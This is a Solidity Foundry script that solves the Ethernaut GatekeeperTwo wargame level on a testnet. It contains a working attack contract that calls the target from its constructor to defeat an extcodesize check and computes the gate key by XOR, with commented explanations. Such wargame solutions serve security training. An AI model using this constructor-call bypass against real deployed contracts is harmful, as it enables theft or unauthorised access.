// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/GatekeeperTwo.sol";

/*
    Solution script for the Ethernaut Level 14: GatekeeperTwo

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in GatekeeperTwoScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/GatekeeperTwo.s.sol:GatekeeperTwoScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/GatekeeperTwo.s.sol/11155111
*/

contract GatekeeperTwoAttack {
    GatekeeperTwo gatekeeper;

    constructor(address target) {
         /*
            Gate Two
            --------

            The logic to pass Gate Two is as follows:

            assembly { x := extcodesize(caller()) }
            require(x == 0);

            This essentially requires that the bytecode size of the caller is 0 meaning that its not from a 
            deployed contact. However, this somewhat contradicts the requirements set in Gate 1 (msg.sender != tx.origin)) which
            require that the call is not mde from an EOA.

            Therefor the solution is to call the enter function directly from the constructor in the GatekeeperTwoAttack contract.
        */

        gatekeeper = GatekeeperTwo(target);

        /*
            Gate Three
            --------

            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)

            This is a simple XOR operation and we know that A XOR B = C is equal to A XOR C = B. Using this logic we can 
            very easily find the value of the unknown _gateKey simply by using the following code:
        */
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

        // call the enter function wiht the key while still in the constuctor to pass Gate Two (see note above)
        gatekeeper.enter{gas: 50000}(key);
    }
}

contract GatekeeperTwoScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x2e01Da47056DB6dA89Cb5079251EecdA72407086;
    GatekeeperTwo level14 = GatekeeperTwo(instance);

    function run() external {
        vm.startBroadcast();

        require(level14.entrant() == address(0x0), 'entrant already updated');

        /*
            Gate One
            --------
            
            To pass Gate One we need to call GatekeeperOne enter function via 
            a separately deployed GatekeeperOneAttack contact such that the context in the 
            enter function will be

                msg.sender == GatekeeperTwoAttack contract address
                tx.origin == attacker EOA address

            Since Gate Once checks that msg.sender != tx.origin this will pass Gate One.

            NOTE: Explainations for passing Gate Two and Gate Three can be found 
            in the GatekeeperTwoAttack contract in line comments.
        */
        new GatekeeperTwoAttack(instance);

        require(level14.entrant() == msg.sender, 'attacker not the entrant');

        vm.stopBroadcast();
    }
}
